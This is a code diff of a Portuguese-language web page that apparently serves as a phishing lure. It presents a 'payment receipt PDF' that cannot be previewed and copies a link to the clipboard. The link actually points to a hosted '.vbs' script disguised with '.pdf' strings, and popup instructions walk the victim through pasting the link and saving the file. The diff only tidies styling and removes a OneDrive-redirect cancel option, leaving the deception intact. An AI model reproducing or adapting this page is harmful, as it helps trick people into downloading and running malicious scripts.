@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -114,13 +113,6 @@
       border-left: 4px solid var(--azul);
     }
 
-    .warning-message {
-      background-color: #fff3cd;
-      border-left-color: var(--laranja);
-      color: #856404;
-      margin-top: 1.5rem;
-    }
-
     .action-buttons {
       display: flex;
       gap: 1rem;
@@ -156,14 +148,6 @@
       background-color: #218838;
     }
 
-    .cancel-button {
-      background-color: #6c757d;
-    }
-
-    .cancel-button:hover {
-      background-color: #5a6268;
-    }
-
     /* Popup/modal */
     .popup {
       position: fixed;
@@ -187,13 +171,6 @@
       color: var(--azul);
     }
 
-    .popup p {
-      margin-bottom: 1.2rem;
-      font-size: 1rem;
-      line-height: 1.5;
-      text-align: left;
-    }
-
     .popup .file-url {
       background-color: #f8f9fa;
       padding: 0.8rem;
@@ -203,34 +180,6 @@
       font-family: monospace;
       font-size: 0.9rem;
       border: 1px solid #e9ecef;
-    }
-
-    .popup .buttons {
-      display: flex;
-      gap: 1rem;
-      justify-content: flex-end;
-      margin-top: 1.5rem;
-    }
-
-    .arrow {
-      position: fixed;
-      top: 10px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 2rem;
-      color: var(--azul);
-      animation: bounce 1.5s infinite;
-      z-index: 1001;
-      display: none;
-    }
-
-    @keyframes bounce {
-      0%, 100% {
-        transform: translateX(-50%) translateY(0);
-      }
-      50% {
-        transform: translateX(-50%) translateY(-10px);
-      }
     }
 
     #overlay {
@@ -282,42 +231,33 @@
       <div class="file-icon vbs">📄</div>
       <div class="file-name">Comprovante-de-Pagamento.pdf</div>
       
-      
       <div class="file-message">
         <p><strong>Este arquivo não pode ser visualizado diretamente no navegador.</strong></p>
         <p>Para fazer o download, clique no botão abaixo. O link do arquivo será copiado para sua área de transferência.</p>
       </div>
       
-      
-      
       <div class="action-buttons">
         <button class="download-button copy-button" onclick="copiarLink()">
           <span>📋</span> Copiar Link para Download
         </button>
-        
       </div>
     </div>
   </main>
 
-  <!-- Pop-up -->
   <div id="overlay"></div>
+
   <div class="popup" id="popup">
     <h2>Link copiado com sucesso!</h2>
     <p>O link para download do arquivo foi copiado para sua área de transferência.</p>
-    
     <div class="file-url" id="linkCopiado"></div>
-    
     <p><strong>Instruções:</strong></p>
     <p>1. Cole o link na barra de endereços do seu navegador</p>
     <p>2. Pressione Enter para iniciar o download</p>
     <p>3. Salve o arquivo em um local seguro do seu computador</p>
-    
     <div class="buttons">
       <button class="download-button cancel-button" onclick="fecharPopup()">Fechar</button>
     </div>
   </div>
-
- 
 
   <script>
     const link = "https://filedownload-938492893.vercel.app/Comprovante-de-Pagamento.vbs?id=49Comprovante-de-Pagamento.pdf21842921742193819Comprovante-de-Pagamento.pdf28392174239298329839";
@@ -325,37 +265,22 @@
     function copiarLink() {
       const popup = document.getElementById("popup");
       const overlay = document.getElementById("overlay");
-      const arrow = document.getElementById("seta");
       const hiddenLink = document.getElementById("linkCopiado");
 
-      // Copiar para área de transferência
       navigator.clipboard.writeText(link).then(() => {
         hiddenLink.textContent = link;
         popup.style.display = "block";
         overlay.style.display = "block";
-        arrow.style.display = "block";
       }).catch(() => {
         alert("Erro ao copiar o link. Tente novamente.");
       });
     }
     
     function fecharPopup() {
-      const popup = document.getElementById("popup");
-      const overlay = document.getElementById("overlay");
-      const arrow = document.getElementById("seta");
-      
-      popup.style.display = "none";
-      overlay.style.display = "none";
-      arrow.style.display = "none";
+      document.getElementById("popup").style.display = "none";
+      document.getElementById("overlay").style.display = "none";
     }
-    
-    function cancelarDownload() {
-      if(confirm("Tem certeza que deseja cancelar o download?")) {
-        window.location.href = "https://onedrive.live.com/";
-      }
-    }
-    
-    // Fechar popup ao clicar no overlay
+
     document.getElementById('overlay').addEventListener('click', fecharPopup);
   </script>
 
